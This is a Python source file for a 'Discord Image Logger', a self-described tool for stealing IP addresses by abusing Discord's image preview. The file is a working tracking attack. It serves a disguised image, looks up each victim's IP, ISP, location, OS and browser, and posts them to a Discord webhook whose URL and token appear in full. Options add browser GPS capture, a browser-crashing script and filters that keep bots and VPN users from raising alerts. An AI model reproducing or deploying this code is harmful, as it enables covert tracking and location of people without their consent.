
# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1444949470893707407/gMx2BXjvlr2Ses0w5Wf4n2jGcmAJpS-9zAT2MAIg5uoWEzIzurobBnAnuTnWe-V6Q9Dv",
    "image": "data:image/png;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
